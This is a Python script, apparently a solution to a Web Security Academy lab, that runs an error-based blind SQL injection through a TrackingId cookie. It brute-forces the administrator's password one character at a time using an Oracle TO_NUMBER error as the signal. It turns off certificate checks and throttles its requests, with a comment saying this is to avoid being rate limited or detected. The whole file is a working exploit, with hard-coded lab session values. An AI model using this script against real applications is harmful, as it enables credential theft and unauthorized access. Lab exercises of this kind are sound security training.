import requests
import string
from urllib.parse import quote
import time

# Disable warnings from SSL/TLS certificates
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Base URL and headers for the request
base_url = "https://0a98009a04ecf1e880d18a2a0099009e.web-security-academy.net/filter?category=Accessories"
headers = {
    "Host": "0a98009a04ecf1e880d18a2a0099009e.web-security-academy.net",
    "Sec-Ch-Ua": '"Chromium";v="129", "Not=A?Brand";v="8"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0a98009a04ecf1e880d18a2a0099009e.web-security-academy.net/",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "close",
}

# Characters to brute-force (a-z, A-Z, 0-9)
characters = string.ascii_letters + string.digits

# Original TrackingId and session (from initial request)
original_tracking_id = "2CUjeSvJO3p38bcb"
session_id = "WriDVPsFTLa5XAYAXcZtIBvNBmALFQ2C"

# Function to brute-force the password
def brute_force_password():
    password = ""
    for position in range(1, 20):  # Positions from 1 to 19 since password length is 19
        found = False
        for char in characters:
            # Construct the SQL injection payload using TO_NUMBER('abc') to trigger an error
            injection = f"'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_NUMBER('abc') ELSE NULL END FROM users WHERE username='administrator')||'"
            # URL encode the injection
            encoded_injection = quote(injection)
            # Construct the TrackingId cookie
            tracking_id = original_tracking_id + encoded_injection
            cookies = {
                "TrackingId": tracking_id,
                "session": session_id
            }

            # Sending the request
            try:
                print(f"[*] Trying character '{char}' for position {position}")
                response = requests.get(base_url, headers=headers, cookies=cookies, verify=False, allow_redirects=False)

                # Check if the response indicates an error (500 Internal Server Error)
                if response.status_code == 500 or "Internal Server Error" in response.text:
                    password += char
                    print(f"[+] Character found at position {position}: {char}")
                    found = True
                    break
                else:
                    print(f"[-] Character '{char}' did not cause an error for position {position}")
                
            except Exception as e:
                print(f"[!] Request failed: {e}")
            
            # Sleep for a bit to avoid being rate limited or detected
            time.sleep(0.2)

        if not found:
            print(f"[!] Character not found at position {position}. Password extraction stopped.")
            break

    print(f"[+] Extracted Password: {password}")

if __name__ == "__main__":
    brute_force_password()
